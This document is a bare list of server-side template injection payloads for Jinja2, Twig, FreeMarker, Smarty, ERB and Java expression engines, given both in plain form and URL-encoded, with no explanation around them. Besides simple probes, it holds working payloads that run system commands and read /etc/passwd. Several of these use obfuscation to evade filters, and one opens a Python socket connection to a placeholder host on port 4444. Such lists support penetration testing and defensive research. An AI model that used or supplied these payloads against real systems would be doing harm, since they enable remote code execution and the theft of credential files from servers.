```

{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
*{7*7}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}



%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A
%7B%7B3%2A3%7D%7D%0A
%7B%7B3%2A%273%27%7D%7D%0A
%3C%25%3D%203%20%2A%203%20%25%3E%0A
%24%7B6%2A6%7D%0A
%24%7B%7B3%2A3%7D%7D%0A
%40%286%2B5%29%0A
%23%7B3%2A3%7D%0A
%23%7B%203%20%2A%203%20%7D%0A
%7B%7Bdump%28app%29%7D%7D%0A
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A
%7B%7Bconfig.items%28%29%7D%7D%0A
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A
%7B%7B%20request%20%7D%7D%0A
%7B%7Bself%7D%7D%0A
%3C%25%3D%20File.open%28%27/etc/passwd%27%29.read%20%25%3E%0A
%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%27/etc/passwd%27%29.read%28%29%20%7D%7D%0A
%7B%7B%20config.items%28%29%5B4%5D%5B1%5D.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%22/etc/passwd%22%29.read%28%29%20%7D%7D%0A
%7B%7B%27%27.__class__.mro%28%29%5B1%5D.__subclasses__%28%29%5B396%5D%28%27cat%20/etc/passwd%27%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%5B0%5D.strip%28%29%7D%7D%0A
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A
%7B%24smarty.version%7D%0A
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A
%7B%7B%5B%27cat%5Cx20/etc/passwd%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A
%7B%7B%5B%27cat%24IFS/etc/passwd%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A
%7B%7Brequest.__class__%7D%7D%0A
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A




